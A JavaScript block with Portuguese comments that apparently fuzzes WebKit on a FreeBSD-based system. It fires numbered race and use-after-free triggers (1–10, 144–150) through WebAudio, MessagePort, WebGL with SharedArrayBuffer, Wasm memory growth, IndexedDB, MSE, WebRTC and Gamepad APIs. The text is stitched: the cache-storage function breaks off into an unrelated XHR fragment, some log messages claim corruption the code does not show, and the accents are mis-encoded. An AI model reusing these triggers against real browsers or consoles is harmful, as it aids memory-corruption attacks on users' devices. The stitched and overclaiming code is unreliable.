    <script>
     function log(msg){
     document.getElementById("log").textContent += msg + "\n";

        // --- 1. WebAudio UAF ---
        // Alvo: Destruir o objeto C++ AudioContext na Main Thread enquanto
        // a Audio Thread no kernel ainda processa o nó oscilador.
        function runAudioContextUAF() {
            log("[WebAudio] Iniciando UAF Race...");
            try {
                let ctx = new (window.AudioContext || window.webkitAudioContext)();
                let osc = ctx.createOscillator();
                osc.start(0);
                
                // Fecha o contexto assincronamente e remove as referęncias para forçar GC
                ctx.close().then(() => log("[WebAudio] Contexto fechado."));
                ctx = null;
                osc = null;
                
                log("[WebAudio] Race disparada. Se o kernel tentar ler o nó, pode causar UAF.");
            } catch(e) {
                log("[WebAudio] Erro: " + e.message);
            }
        }

        // --- 2. MessagePort IPC Entanglement ---
        // Alvo: Confundir o gerenciador de File Descriptors (FDs) do sistema 
        // enviando portas IPC através de si mesmas e fechando-as em trânsito.
        function runPortEntanglement() {
            log("[IPC] Iniciando MessagePort Entanglement...");
            let ch1 = new MessageChannel();
            let ch2 = new MessageChannel();
            
            // Tenta enviar a porta 1 do ch2 através do ch1
            try {
                ch1.port1.postMessage("trigger", [ch2.port1]);
                // Fecha as portas mid-flight (enquanto o C++ tenta mapear os FDs)
                ch1.port1.close();
                ch2.port2.close();
                log("[IPC] Portas fechadas durante o trânsito IPC. Alvo: UAF de File Descriptor.");
            } catch(e) {
                log("[IPC] Erro (Pode ter sido bloqueado nativamente): " + e.message);
            }
        }

        // --- 3. WebGL + SharedArrayBuffer Data Race ---
        // Alvo: Out-of-Bounds Read/Write na placa de vídeo. Um Worker altera o SAB
        // exatamenten no momento em que a Main Thread envia o buffer para o driver da GPU.
        function runWebGLSABRace() {
            log("[WebGL] Iniciando Data Race na GPU...");
            try {
                let sab = new SharedArrayBuffer(1024 * 1024); // 1MB
                let view = new Uint8Array(sab);
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl');
                if(!gl) throw new Error("WebGL năo suportado");

                let tex = gl.createTexture();
                gl.bindTexture(gl.TEXTURE_2D, tex);

                // Worker para alterar o SAB assincronamente (loop FINITO para evitar DoS)
                let workerCode = `
                    onmessage = function(e) {
                        let view = new Uint8Array(e.data);
                        for(let i=0; i<50000; i++) view[0] = i % 255; 
                        postMessage("done");
                    };
                `;
                let blob = new Blob([workerCode], {type: 'application/javascript'});
                let w = new Worker(URL.createObjectURL(blob));

                w.onmessage = () => log("[WebGL] Worker terminou a mutaçăo com sucesso.");
                w.postMessage(sab);

                // Main thread tenta ler o SAB como textura simultaneamente
                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 512, 512, 0, gl.RGBA, gl.UNSIGNED_BYTE, view);
                log("[WebGL] Leitura concluída. Race enviada para a GPU.");
            } catch(e) {
                log("[WebGL] Erro ou SAB desabilitado: " + e.message);
            }
        }

        // --- 4. Blob VFS mmap Revocation Race ---
        // Alvo: O subsistema VFS (Virtual File System). Tenta ler um Blob grande 
        // e instantaneamente revogar a memória mapeada no kernel.
        function runBlobMmapRace() {
            log("[VFS] Iniciando Blob mmap Revocation Race...");
            let data = new Uint8Array(1024 * 1024 * 20).fill(0x41); // 20MB
            let blob = new Blob([data]);
            let url = URL.createObjectURL(blob);

            let reader = new FileReader();
            reader.onload = () => log("[VFS] Leitura concluída (Race falhou em crashar).");
            
            // Inicia a leitura
            reader.readAsArrayBuffer(blob);

            // Aborta e revoga quase instantaneamente
            URL.revokeObjectURL(url);
            reader.abort();
            blob = null;
            
            log("[VFS] Leitura abortada. Estrutura C++ de leitura pode ficar órfă.");
        }

        // --- 5. Worker IPC Transfer Termination Race ---
        // Alvo: Corrupçăo do SharedWorkerThreadProxy C++. Envia um buffer gigante
        // e mata a thread no meio da serializaçăo/transferęncia de memória.
        function runWorkerIPCTerminate() {
            log("[Worker] Iniciando Transfer Termination Race...");
            let workerCode = `onmessage = function(e) { /* void */ };`;
            let blob = new Blob([workerCode], {type: 'application/javascript'});
            let w = new Worker(URL.createObjectURL(blob));

            // Buffer pesado para atrasar propositalmente a engine de IPC
            let buffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB

            // Transfere a propriedade e "mata" a thread na mesma call stack
            w.postMessage(buffer, [buffer]);
            w.terminate();

            log("[Worker] Mensagem em trânsito e Worker terminado abruptamente.");
        }
// --- 6. WebRTC SDP Generation Race ---
        // Alvo: RTCPeerConnection interage fortemente com o kernel para alocar
        // sockets (UDP/TCP). Destruir o objeto enquanto ele gera a oferta assincronamente.
        function runWebRTCRace() {
            log("[WebRTC] Iniciando SDP Race...");
            try {
                let pc = new RTCPeerConnection();
                pc.createDataChannel("exploit");
                
                // Pede para o backend C++ compilar a oferta (SDP)
                let promise = pc.createOffer();
                
                // Imediatamente fecha e remove a referęncia
                pc.close();
                pc = null;
                
                promise.then(() => {
                    log("[WebRTC] Oferta criada após fechamento (Pode ter ocorrido UAF no C++).");
                }).catch(e => {
                    log("[WebRTC] Promessa rejeitada corretamente: " + e.message);
                });
            } catch(e) {
                log("[WebRTC] Erro: " + e.message);
            }
        }

        // --- 7. WebAssembly mmap Growth Race ---
        // Alvo: O WebKit usa mmap() do FreeBSD para alocar memória Wasm.
        // Crescer a memória (grow) remapeia as páginas. Se fizermos isso enquanto escrevemos,
        // podemos causar um Page Fault fatal no kernel ou acessar memória liberada.
        function runWasmMmapGrow() {
            log("[WASM] Iniciando mmap Growth Race...");
            try {
                // Aloca 1 página inicial (64KB) com limite de 10
                let memory = new WebAssembly.Memory({initial: 1, maximum: 10});
                let view = new Uint32Array(memory.buffer);
                
                // Dispara escrita no limite
                view[16383] = 0x41414141; 
                
                // Força o remapeamento (mmap remap interno)
                memory.grow(5); 
                
                // Tenta escrever imediatamente após pedir o crescimento, 
                // competindo com o VMM (Virtual Memory Manager) do kernel.
                view[16383] = 0x42424242;
                
                log("[WASM] Crescimento forçado. Checando se houve corrupçăo OOB...");
            } catch(e) {
                log("[WASM] Erro: " + e.message);
            }
        }

        // --- 8. IndexedDB VFS Transaction Abort ---
        // Alvo: IndexedDB usa SQLite por baixo, que usa File Descriptors reais.
        // Iniciar a gravaçăo de um Blob massivo e abortar abruptamente destrói o estado do VFS.
        function runIndexedDBAbort() {
            log("[IDB] Iniciando VFS Transaction Abort...");
            let req = indexedDB.open("RaceDB", 1);
            
            req.onupgradeneeded = function(e) {
                let db = e.target.result;
                if(!db.objectStoreNames.contains("store")) {
                    db.createObjectStore("store");
                }
            };
            
            req.onsuccess = function(e) {
                let db = e.target.result;
                let tx = db.transaction("store", "readwrite");
                let store = tx.objectStore("store");
                
                // Blob gigante
                let payload = new Blob([new Uint8Array(1024 * 1024 * 15)]); 
                store.put(payload, "key1");
                
                // Aborta a transaçăo do SQLite imediatamente
                tx.abort();
                db.close();
                log("[IDB] Gravaçăo VFS abortada em pleno voo.");
            };
        }

        // --- 9. Gamepad HID Polling GC Race ---
        // Alvo: navigator.getGamepads() consulta diretamente os drivers HID (Human Interface Device).
        // A triagem busca dessincronizar a lista de arrays em C++ da representaçăo em JS.
        function runGamepadPollingRace() {
            log("[HID] Iniciando Gamepad Polling Race...");
            if(!navigator.getGamepads) {
                log("[HID] API năo suportada.");
                return;
            }
            
            try {
                let pads = navigator.getGamepads();
                // Tenta ler e forçar a coleta da referęncia original simultaneamente
                setTimeout(() => {
                    pads = null;
                    let pads2 = navigator.getGamepads();
                    log("[HID] Polling duplo concluído.");
                }, 0);
                
                log("[HID] Consultando driver de hardware...");
            } catch(e) {
                log("[HID] Erro: " + e.message);
            }
        }

        // --- 10. Cache API File Descriptor Interruption ---
        // Alvo: O CacheStorage escreve diretamente no disco (kernel FDs). 
        // Abortar o signal de um Fetch e deletar o cache simultaneamente gera Use-After-Free no I/O.
        function runCacheStorageIO() {
            log("[Cache] Iniciando I/O Interruption Race...");
            if(!window.caches) {
                log("[Cache] API de Cache năo suportada.");
                return;
            }

            let abortController = new AbortController();
            let payload = new Response(new Blob([new Uint8Array(1024 * 1024 * 10)])); // 10MB
            
            caches.open('poc-cache').then(cache => {

                log("[Net/Mem] Memória do XHR desanexada e roteada no momento do dispatch do C++.");
            };
            
            try { xhr.send(); } catch(e) {}
            // Aborta se năo houver resposta rápida para testar o teardown
            setTimeout(() => { xhr.abort(); }, 20);
        }

        // --- 144. SVG feDisplacementMap GPU Raster Teardown ---
        // Alvo: Aceleraçăo por hardware e acesso direto a memória de texturas (VRAM).
        // Este filtro SVG mapeia os pixels de uma imagem baseando-se noutra matriz de pixels,
        // o que causa um processamento infernal no rasterizador C++ / GPU.
        function runSVGFEDisplacementMapTeardown() {
            log("[GPU/SVG] A iniciar feDisplacementMap Teardown...");
            
            let div = document.createElement('div');
            div.innerHTML = `
                <svg width="0" height="0">
                    <filter id="displace">
                        <feTurbulence type="fractalNoise" baseFrequency="0.05" numOctaves="5" result="noise" />
                        <feDisplacementMap in="SourceGraphic" in2="noise" scale="50" xChannelSelector="R" yChannelSelector="G" />
                    </filter>
                </svg>
                <div id="targetDisplace" style="width:1000px; height:1000px; background:blue; filter:url(#displace);"></div>
            `;
            document.body.appendChild(div);
            
            // Força o C++ a pedir ao driver de vídeo para gerar o mapa de deslocamento
            div.getBoundingClientRect();
            
            // Destrói a árvore do DOM enquanto a placa gráfica (ou a biblioteca gráfica nativa)
            // está a calcular o deslocamento pixel a pixel na memória.
            setTimeout(() => {
                document.body.removeChild(div);
                log("[GPU/SVG] Filtro de deslocamento destruído durante cálculo intensivo de rasterizaçăo.");
            }, 5);
        }

        // --- 145. MSE Append/Remove Buffer Native Race ---
        // Alvo: O pipeline de MediaSource Extensions comunicando com os demuxers de mídia do SO.
        function runMediaSourceAppendRemoveRace() {
            log("[Media/SO] A iniciar MSE Append/Remove Race...");
            if (!window.MediaSource) return log("[Media] MSE năo suportado.");

            let ms = new MediaSource();
            let video = document.createElement('video');
            video.src = URL.createObjectURL(ms);

            ms.addEventListener('sourceopen', function() {
                try {
                    // O C++ liga isto aos decodificadores H.264 do hardware
                    let sourceBuffer = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
                    
                    let fakeChunk = new Uint8Array(1024 * 1024 * 2); // 2MB
                    
                    // Dispara a anexaçăo (o demuxer nativo começa a mastigar o buffer)
                    sourceBuffer.appendBuffer(fakeChunk);
                    
                    // Removemos a faixa de tempo imediatamente. O C++ tem de instruir o 
                    // kernel/driver a abortar o parsing e deitar fora a memória alocada.
                    sourceBuffer.remove(0, 10);
                    
                    log("[Media/SO] Buffer removido enquanto o demuxer do SO processava o chunk.");
                } catch(e) {
                    log("[Media/SO] Erro MSE: " + e.message);
                }
            });
        }
// --- 146. Image.decode() Background Pthread Teardown ---
        // Alvo: Pthreads nativas de descodificaçăo de imagem (libjpeg/libpng via SO).
        // Diferente de carregar uma imagem no DOM, .decode() força a descodificaçăo 
        // assíncrona numa thread C++ separada antes de a atirar para a GPU.
        function runImageDecodePthreadTeardown() {
            log("[CPU/Image] A iniciar Image.decode() Pthread Teardown...");
            
            // Criamos uma imagem BMP massiva e malformada na memória para atrasar o parser nativo
            let fakeBmp = new Uint8Array(1024 * 1024 * 30).fill(0x00); 
            fakeBmp[0] = 0x42; fakeBmp[1] = 0x4D; // Header BMP falso
            let blob = new Blob([fakeBmp], {type: "image/bmp"});
            let img = new Image();
            img.src = URL.createObjectURL(blob);
            
            // Atira a carga para a thread de descodificaçăo em C++
            let decodePromise = img.decode().catch(()=>{});
            
            // No exato momento em que o parser nativo tenta ler os bytes alocados,
            // destruímos a referęncia da imagem e revogamos o descritor VFS.
            setTimeout(() => {
                URL.revokeObjectURL(img.src);
                img.src = '';
                img = null;
                decodePromise = null;
                log("[CPU/Image] Imagem aniquilada durante a descodificaçăo nativa em background.");
            }, 3);
        }

        // --- 147. OS Drag & Drop IPC Daemon Race ---
        // Alvo: O daemon de área de transferęncia (Clipboard/Drag) do FreeBSD.
        function runDragAndDropOSDaemonRace() {
            log("[OS/Daemon] A iniciar Drag & Drop OS Daemon Race...");
            
            let div = document.createElement('div');
            div.draggable = true;
            document.body.appendChild(div);
            
            div.addEventListener('dragstart', (e) => {
                // Injetamos um payload gigante no DataTransfer.
                // O WebKit tem de serializar isto via IPC para o gestor de janelas/SO
                // para que outras aplicaçőes ou partes do sistema possam receber o "drop".
                let massivePayload = "A".repeat(1024 * 1024 * 10); // 10MB
                e.dataTransfer.setData('text/plain', massivePayload);
                
                // O C++ está ativamente a copiar os 10MB para a memória partilhada do SO.
                // Destruímos o elemento instantaneamente.
                document.body.removeChild(div);
                log("[OS/Daemon] Nó de Drag & Drop destruído durante transferęncia IPC para o SO.");
            });
            
            // Simula o início do drag (em alguns motores isto força a execuçăo do evento)
            let event = new DragEvent('dragstart');
            try { div.dispatchEvent(event); } catch(err) {}
            
            // Limpeza caso o evento síncrono năo funcione no ambiente restrito
            if (div.parentNode) document.body.removeChild(div);
        }

        // --- 148. WebRTC Hardware Track Clone Native Panic ---
        // Alvo: O grafo de objetos C++ e o roteamento de hardware de captura.
        function runWebRTCHardwareTrackClonePanic() {
            log("[Hardware/Media] A iniciar Hardware Track Clone Panic...");
            
            let canvas = document.createElement('canvas');
            let stream = canvas.captureStream(60);
            let track = stream.getVideoTracks()[0];
            
            // O C++ WebCore tem de criar um novo ponteiro nativo que escuta o mesmo
            // descritor de hardware de origem.
            let clonedTrack = track.clone();
            
            let pc = new RTCPeerConnection({iceServers: []});
            pc.addTrack(clonedTrack, stream);
            
            pc.createOffer().then(offer => {
                pc.setLocalDescription(offer);
                
                // Corrida: A rede está a tentar aceder ao clone.
                // Nós matamos a track original (fechando a torneira do hardware) e 
                // destruímos a conexăo TCP/UDP simultaneamente.
                track.stop();
                pc.close();
                clonedTrack = null;
                
                log("[Hardware/Media] Track original de hardware fechada enquanto a rede tentava ler o clone.");
            });
        }

        // --- 149. Blob.arrayBuffer() Promise VFS Teardown ---
        // Alvo: A API Promise moderna lidando com leituras assíncronas no disco (VFS).
        function runBlobPromiseVFSTeardown() {
            log("[WebCore/VFS] A iniciar Blob Promise VFS Teardown...");
            
            let massiveBlob = new Blob([new Uint8Array(1024 * 1024 * 50).fill(0x77)]); // 50MB
            let url = URL.createObjectURL(massiveBlob);
            
            // Diferente do FileReader, o arrayBuffer() resolve diretamente numa Promise C++
            let promise = massiveBlob.arrayBuffer();
            
            promise.then(buffer => {
                log("[WebCore/VFS] Leitura assíncrona concluída anomalia.");
            }).catch(() => {});
            
            // A thread de I/O desceu para o kernel e está a puxar os 50MB.
            // Revogamos o URL que originou o Vnode e anulamos as referęncias JS
            // na esperança de que o GC apague o resolvedor da promessa antes do kernel retornar.
            setTimeout(() => {
                URL.revokeObjectURL(url);
                massiveBlob = null;
                promise = null;
                log("[WebCore/VFS] Blob e Promise anulados durante syscall assíncrona de I/O.");
            }, 5);
        }

        // --- 150. Gamepad HID Agressive Polling Disconnect ---
        // Alvo: O controlador de interrupçőes HID no núcleo do navegador.
        function runGamepadHIDPollingDisconnect() {
            log("[Hardware/HID] A iniciar HID Polling Disconnect...");
            
            let iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            
            // Cria um loop infernal a pedir o estado físico do hardware de entrada
            // Isto força o WebKit a comunicar constantemente com os drivers da consola.
            let loopId = iframe.contentWindow.setInterval(() => {
                if(iframe.contentWindow.navigator.getGamepads) {
                    iframe.contentWindow.navigator.getGamepads();
                }
            }, 0); // Polling o mais rápido que a CPU permitir
            
            // Arrancamos a janela que regista este "ouvinte" da tabela de roteamento de 
            // interrupçőes de hardware do C++.
            setTimeout(() => {
                iframe.contentWindow.clearInterval(loopId);
                document.body.removeChild(iframe);
                log("[Hardware/HID] Tabela de roteamento HID corrompida devido a polling massivo.");
            }, 10);
        }
    </script>
